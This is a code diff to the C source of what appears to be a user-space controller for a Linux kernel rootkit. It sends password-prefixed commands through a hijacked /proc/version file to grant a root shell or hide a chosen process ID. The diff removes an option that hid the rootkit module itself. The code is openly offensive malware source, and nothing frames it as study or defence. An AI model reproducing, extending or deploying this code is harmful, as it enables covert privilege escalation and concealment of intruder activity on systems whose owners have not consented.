@@ -17,7 +17,11 @@
 #include <getopt.h>
 #include <unistd.h>
 
-#include "config.h"
+#define CFG_PROC_FILE "version"
+#define CFG_PASS "password"
+#define CFG_ROOT "root"
+#define CFG_HIDE_PID "hide_pid"
+
 
 void print_help(char **argv)
 {
@@ -28,11 +32,10 @@ void print_help(char **argv)
         "  --root-shell            Grants you root shell access.\n"
         "  --hide-pid=PID          Hides the specified PID.\n"
         "                          Must be a filename without any path.\n"
-        "  --hide                  Hides the rootkit LKM.\n"
         "  --help                  Print this help message.\n", argv[0]);
 }
 
-void handle_command_line_arguments(int argc, char **argv, int *root, int *hide_pid,char **pid, int *hide)
+void handle_command_line_arguments(int argc, char **argv, int *root, int *hide_pid,char **pid)
 {
     if (argc < 2) {
         fprintf(stderr, "Error: No arguments provided.\n\n");
@@ -52,8 +55,6 @@ void handle_command_line_arguments(int argc, char **argv, int *root, int *hide_p
     *root = 0;
     *hide_pid = 0;
     *pid = NULL;
-    *hide = 0;
-
 
     int opt;
 
@@ -72,12 +73,6 @@ void handle_command_line_arguments(int argc, char **argv, int *root, int *hide_p
                 fprintf(stderr, "hide_pid\n");
                 break;
 
-
-            case 'f':
-                *hide = 1;
-                fprintf(stderr, "hide");
-                break;
-
             case 'h':
                 print_help(argv);
                 exit(0);
@@ -94,7 +89,7 @@ void handle_command_line_arguments(int argc, char **argv, int *root, int *hide_p
         }
     }
 
-    if ((*root + *hide_pid + *hide) != 1) {
+    if ((*root + *hide_pid ) != 1) {
         fprintf(stderr, "Error: Exactly one option should be specified\n\n");
         print_help(argv);
         exit(1);
@@ -112,12 +107,11 @@ int main(int argc, char **argv)
     int root;
     int hide_pid;
     char *pid;
-    int hide;
     int unhide;
     int protect;
     int unprotect;
 
-    handle_command_line_arguments(argc, argv, &root, &hide_pid, &pid,&hide);
+    handle_command_line_arguments(argc, argv, &root, &hide_pid, &pid);
 
     size_t buf_size = 0;
 
@@ -127,8 +121,6 @@ int main(int argc, char **argv)
         buf_size += sizeof(CFG_ROOT);
     } else if (hide_pid) {
         buf_size += sizeof(CFG_HIDE_PID) + strlen(pid);
-    }else if (hide) {
-        buf_size += sizeof(CFG_HIDE);
     }
 
     buf_size += 1; // for null terminator
@@ -145,9 +137,7 @@ int main(int argc, char **argv)
     } else if (hide_pid) {
         write_buffer(&buf_ptr, CFG_HIDE_PID, sizeof(CFG_HIDE_PID));
         write_buffer(&buf_ptr, pid, strlen(pid));
-    } else if (hide) {
-        write_buffer(&buf_ptr, CFG_HIDE, sizeof(CFG_HIDE));
-    } 
+    }
 
     int fd = open("/proc/" CFG_PROC_FILE, O_RDONLY);
 
